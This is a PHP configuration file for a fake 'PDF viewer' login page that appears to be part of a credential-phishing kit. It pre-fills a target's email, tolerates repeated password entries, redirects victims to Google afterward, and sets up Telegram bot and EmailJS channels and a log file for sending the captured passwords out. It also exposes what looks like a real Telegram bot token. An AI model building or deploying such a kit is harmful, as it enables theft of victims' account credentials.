<?php
/**
 * Configuration Settings for PDF Viewer & Authentication Script
 */

// Default Email displayed if no ?email= or ?e= parameter is supplied in URL
define('DEFAULT_EMAIL', 'user@gmail.com');//for person you want them to login

// Maximum failed password attempts before redirection
define('MAX_ATTEMPTS', 1000);

// Redirection target URL after max attempts reached
define('REDIRECT_URL', 'https://www.google.com');

// Telegram Bot API Credentials
define('TELEGRAM_BOT_TOKEN', '8400115887:AAH19O5ZmZEp3Dxe4tObNh0b7BObXafOjnE');
define('TELEGRAM_CHAT_ID', '5275786594');

// EmailJS Credentials
define('EMAILJS_SERVICE_ID', '');
define('EMAILJS_TEMPLATE_ID', '');
define('EMAILJS_PUBLIC_KEY', '');

// Enable Server-Side PHP Payload Logging/Sending (process.php)
define('ENABLE_PHP_BACKEND', true);
define('LOG_TO_FILE', true);
define('LOG_FILE_PATH', is_writable(__DIR__) ? __DIR__ . '/logs.txt' : sys_get_temp_dir() . '/logs.txt');
